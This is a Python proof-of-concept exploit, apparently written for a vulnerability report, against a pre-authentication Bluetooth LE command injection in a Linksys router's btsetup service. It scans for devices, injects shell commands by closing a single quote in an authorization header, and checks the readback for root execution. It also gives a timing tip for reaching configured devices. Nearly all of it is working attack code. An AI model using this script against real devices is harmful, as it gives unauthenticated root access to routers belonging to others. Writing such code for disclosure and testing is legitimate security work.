#!/usr/bin/env python3
"""PoC for report-8: pre-auth BLE btsetup command injection (single-quote closure).

The btsetup GATT peripheral accepts writes without pairing. Three header lines
are written to Data (0x2082); a 0x01 trigger to CP (0x2081) makes btsetup build
"/usr/bin/btjnap -a '<action>' -u '<auth>' -j '<json>'" and popen() it as root.
A single quote in X-JNAP-Authorization closes the -u quoting; a semicolon
injects arbitrary commands whose output comes back over the same characteristic.

usage:
  pip install bleak
  py -3 poc.py --cmd "id; uname -a"          # scan for any 0x2080 advertiser
  py -3 poc.py --addr 80:69:1A:60:FA:88      # target a specific device
  # Configured Master target: unplug WAN ~10s first; advertising window opens
  # for 30-60s (keep the script scanning until the device appears).

Requires a BLE adapter (built-in Bluetooth on Windows works).
For owned devices only.
"""
import argparse
import asyncio
import sys
import time

try:
    from bleak import BleakScanner, BleakClient
except ImportError:
    sys.exit("pip install bleak first")

SVC = "00002080-8eab-46c2-b788-0e9440016fd1"
C_CP = "00002081-8eab-46c2-b788-0e9440016fd1"
C_DATA = "00002082-8eab-46c2-b788-0e9440016fd1"

BENIGN_AUTH = "Basic YWRtaW46YWRtaW4="  # wrong on purpose: channel check only


def jnap_text(auth_line):
    return ("X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/StartSmartConnectClient\r\n"
            "X-JNAP-Authorization: " + auth_line + "\r\n"
            '{ "param": "x" }').encode()


def build_injection(cmd):
    # single-quote closure of the -u '%s' field, then the command, then re-open quote
    return "Basic YWRtaW46YWRtaW4=' ; " + cmd + " > /tmp/poc_b1_out 2>&1 ; '"


def log(m):
    print(time.strftime("%H:%M:%S"), m, flush=True)


async def find_chars(c):
    ch_cp = ch_d = None
    for s in c.services:
        for ch in s.characteristics:
            if str(ch.uuid) == C_CP:
                ch_cp = ch
            if str(ch.uuid) == C_DATA:
                ch_d = ch
    return ch_cp, ch_d


async def round_trip(c, label, auth_line, settle=6.0):
    ch_cp, ch_d = await find_chars(c)
    if not (ch_cp and ch_d):
        log(f"[{label}] GATT characteristics not found")
        return None
    text = jnap_text(auth_line)
    log(f"[{label}] payload={text!r}")
    await c.write_gatt_char(ch_d, text, response=True)
    await asyncio.sleep(0.3)
    await c.write_gatt_char(ch_cp, b"\x01", response=True)
    log(f"[{label}] DATA+CP written, waiting {settle}s ...")
    await asyncio.sleep(settle)
    v = await c.read_gatt_char(ch_d)
    log(f"[{label}] readback: {bytes(v)!r}")
    return bytes(v)


async def main_async(addr, cmd):
    if addr:
        devices = [type("D", (), {"address": addr, "name": "target"})()]
    else:
        log("[scan] scanning for btsetup advertisers (service 0x2080) ...")
        devices = await BleakScanner.scan(timeout=10.0)
    for d in devices:
        address = getattr(d, "address", str(d))
        try:
            async with BleakClient(address, timeout=15.0) as c:
                log(f"[connect] CONNECTED {address} (no pairing - pre-auth surface)")
                r = await round_trip(c, "BENIGN", BENIGN_AUTH)
                if r is None:
                    continue
                inj = build_injection(cmd)
                r = await round_trip(c, "INJECT", inj, settle=8.0)
                if r and b"uid=0" in bytes(r):
                    log("[+] ROOT EXECUTION CONFIRMED (in-band readback)")
                elif r:
                    log("[-] readback did not contain command output; check /tmp/poc_b1_out on device")
        except Exception as e:
            log(f"[!] {address}: {type(e).__name__}: {e}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--addr", default=None, help="target BLE address (omit to scan)")
    ap.add_argument("--cmd", default="id; uname -a", help="command to inject")
    args = ap.parse_args()
    asyncio.run(main_async(args.addr, args.cmd))
